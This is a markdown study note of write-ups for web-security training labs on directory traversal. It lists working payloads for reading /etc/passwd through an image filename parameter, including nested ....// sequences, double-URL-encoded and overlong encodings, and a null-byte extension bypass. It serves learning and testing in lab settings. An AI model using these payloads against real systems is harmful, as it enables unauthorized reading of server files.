# Directory Traversal 

Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. 

UNIX system              ../

Windows system works     ../ and ..\ 


```GET /image?filename=../../../etc/passwd```

```GET /image?filename=/etc/passwd ```

### File path traversal, simple case

This lab contains a file path traversal vulnerability in the display of product images.

**Solution**
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the *filename* parameter, giving it the value:

    ``` ../../../etc/passwd ```

3. Observe that the response contains the contents of the */etc/passwd* file.

**My comment**

```GET /image?filename=../../../etc/passwd```

### File path traversal, traversal sequences blocked with absolute path bypass

This lab contains a file path traversal vulnerability in the display of product images.
The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

**Solution**
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the *filename* parameter, giving it the value */etc/passwd*.
3. Observe that the response contains the contents of the */etc/passwd* file.

**My comment**

```GET /image?filename=/etc/passwd```

### File path traversal, traversal sequences stripped non-recursively

This lab contains a file path traversal vulnerability in the display of product images.
The application strips path traversal sequences from the user-supplied filename before using it.

**Solution**
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    ```....//....//....//etc/passwd```

3. Observe that the response contains the contents of the /etc/passwd file.

**My comment**

```GET /image?filename=....//....//....//etc/passwd```

It could be use nested traversal sequences ```....// or ....\/ ```

### File path traversal, traversal sequences stripped with superfluous URL-decode

**Solution**

1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    ```..%252f..%252f..%252fetc/passwd```

3. Observe that the response contains the contents of the /etc/passwd file.

**My comment**

```..%252f..%252f..%252fetc/passwd``` or ```%2e%2e%2f or %252e%252e%252f```

Various non-standard encodings, such as ```..%c0%af``` or ```..%ef%bc%8f```, may also do the trick.

### File path traversal, validation of start of path

This lab contains a file path traversal vulnerability in the display of product images.
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

**Solution**
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the *filename* parameter, giving it the value:

    ```/var/www/images/../../../etc/passwd```

3. Observe that the response contains the contents of the */etc/passwd* file.

**My comment**

```GET /image?filename=/var/www/images/../../../etc/passwd```

### File path traversal, validation of file extension with null byte bypass

This lab contains a file path traversal vulnerability in the display of product images.
The application validates that the supplied filename ends with the expected file extension.

**Solution**
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    ```../../../etc/passwd%00.png```

3. Observe that the response contains the contents of the /etc/passwd file.

**My comment**

```GET /image?filename=../../../etc/passwd%00.png```